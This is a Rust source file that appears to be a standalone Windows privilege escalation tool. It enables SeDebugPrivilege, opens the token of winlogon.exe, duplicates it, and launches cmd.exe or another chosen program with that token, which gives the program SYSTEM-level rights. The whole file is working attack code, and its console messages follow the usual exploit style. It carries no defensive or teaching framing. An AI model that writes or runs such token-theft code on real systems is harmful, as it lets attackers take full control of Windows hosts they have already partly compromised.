#[cfg(windows)]
use std::{env, ffi::OsStr, os::windows::ffi::OsStrExt};

#[cfg(windows)]
use windows::{
    Win32::{
        Foundation::{CloseHandle, HANDLE, LUID},
        Security::{
            AdjustTokenPrivileges, DuplicateTokenEx, LUID_AND_ATTRIBUTES, LookupPrivilegeValueW,
            SE_PRIVILEGE_ENABLED, SecurityImpersonation, TOKEN_ADJUST_PRIVILEGES, TOKEN_ALL_ACCESS,
            TOKEN_DUPLICATE, TOKEN_PRIVILEGES, TOKEN_QUERY, TokenPrimary,
        },
        System::{
            Environment::{CreateEnvironmentBlock, DestroyEnvironmentBlock},
            Threading::{
                CREATE_UNICODE_ENVIRONMENT, CreateProcessWithTokenW, LOGON_WITH_PROFILE,
                OpenProcess, OpenProcessToken, PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION,
                STARTUPINFOW,
            },
        },
    },
    core::{PCWSTR, PWSTR},
};

#[cfg(windows)]
fn enable_privilege(privilege_name: &str) -> Result<(), windows::core::Error> {
    unsafe {
        let mut current_process_token = HANDLE::default();
        OpenProcessToken(
            windows::Win32::System::Threading::GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut current_process_token,
        )?;

        let mut luid = LUID::default();
        let priv_name: Vec<u16> = OsStr::new(privilege_name)
            .encode_wide()
            .chain(Some(0))
            .collect();

        LookupPrivilegeValueW(None, PCWSTR(priv_name.as_ptr()), &mut luid)?;

        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };

        AdjustTokenPrivileges(
            current_process_token,
            false,
            Some(&mut tp),
            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            None,
            None,
        )?;

        CloseHandle(current_process_token)?;
    }
    Ok(())
}

#[cfg(windows)]
fn parse_env_block(env_block: *mut std::ffi::c_void) -> std::collections::HashMap<String, String> {
    let mut map = std::collections::HashMap::new();
    let mut ptr = env_block as *const u16;

    unsafe {
        while *ptr != 0 {
            let mut len = 0;
            while *ptr.add(len) != 0 {
                len += 1;
            }
            let slice = std::slice::from_raw_parts(ptr, len);
            if let Ok(s) = String::from_utf16(slice) {
                // Handle hidden variables that start with '=' (e.g., =C: for current directory)
                if s.starts_with('=') {
                    // We can't easily store these in a standard HashMap without conflicts or special handling.
                    // For now, we'll prefix them with a special character or just skip if we don't strictly need them
                    // for the specific use case. But better to try to preserve if possible.
                    // A simple hack: Store them with the full string as the value and a generated key,
                    // or just skip. Most apps don't rely on them.
                    // Let's skip them for simplicity in this example to avoid HashMap key collisions for empty keys.
                } else if let Some((key, value)) = s.split_once('=') {
                    map.insert(key.to_string(), value.to_string());
                }
            }
            ptr = ptr.add(len + 1);
        }
    }
    map
}

#[cfg(windows)]
fn create_env_block(map: &std::collections::HashMap<String, String>) -> Vec<u16> {
    let mut block = Vec::new();
    let mut keys: Vec<&String> = map.keys().collect();
    keys.sort_by(|a, b| a.to_lowercase().cmp(&b.to_lowercase()));

    for key in keys {
        let value = &map[key];
        block.extend(std::ffi::OsStr::new(key).encode_wide());
        block.push('=' as u16);
        block.extend(std::ffi::OsStr::new(value).encode_wide());
        block.push(0);
    }
    block.push(0);
    block
}

#[cfg(windows)]
use sysinfo::System; // Use System trait from sysinfo

#[cfg(windows)]
fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    let target_process = if args.len() > 1 { &args[1] } else { "cmd.exe" };

    println!("[*] Enabling SeDebugPrivilege...");
    enable_privilege("SeDebugPrivilege")?;

    println!("[*] Finding winlogon.exe process ID...");
    let mut system = System::new_all();
    system.refresh_all();

    let winlogon_pid = system
        .processes_by_name("winlogon.exe".as_ref())
        .next()
        .map(|p| p.pid().as_u32())
        .ok_or("Failed to find winlogon.exe")?;

    println!("[+] winlogon.exe PID: {}", winlogon_pid);

    unsafe {
        println!("[*] Opening winlogon.exe process...");
        let h_process = OpenProcess(PROCESS_QUERY_INFORMATION, false, winlogon_pid)?;

        println!("[*] Opening winlogon.exe token...");
        let mut h_token = HANDLE::default();
        OpenProcessToken(h_process, TOKEN_DUPLICATE | TOKEN_QUERY, &mut h_token)?;

        println!("[*] Duplicating token...");
        let mut h_dup_token = HANDLE::default();
        DuplicateTokenEx(
            h_token,
            TOKEN_ALL_ACCESS,
            None,
            SecurityImpersonation,
            TokenPrimary,
            &mut h_dup_token,
        )?;

        println!(
            "[*] Creating process with duplicated token: {}",
            target_process
        );
        let mut command_line: Vec<u16> = OsStr::new(target_process)
            .encode_wide()
            .chain(Some(0))
            .collect();

        let mut startup_info = STARTUPINFOW {
            cb: std::mem::size_of::<STARTUPINFOW>() as u32,
            ..Default::default()
        };
        let mut process_information = PROCESS_INFORMATION::default();

        println!("[*] Creating environment block...");
        let mut lp_environment: *mut std::ffi::c_void = std::ptr::null_mut();
        CreateEnvironmentBlock(&mut lp_environment, h_dup_token, false)?;

        let res = CreateProcessWithTokenW(
            h_dup_token,
            LOGON_WITH_PROFILE,
            None,
            PWSTR(command_line.as_mut_ptr()),
            CREATE_UNICODE_ENVIRONMENT,
            Some(lp_environment as *const std::ffi::c_void),
            None,
            &mut startup_info,
            &mut process_information,
        );

        DestroyEnvironmentBlock(lp_environment)?;
        res?;

        println!(
            "[+] Process created successfully! PID: {}",
            process_information.dwProcessId
        );

        CloseHandle(process_information.hProcess)?;
        CloseHandle(process_information.hThread)?;
        CloseHandle(h_dup_token)?;
        CloseHandle(h_token)?;
        CloseHandle(h_process)?;
    }

    Ok(())
}

#[cfg(not(windows))]
fn main() {
    println!("This program is only supported on Windows.");
}
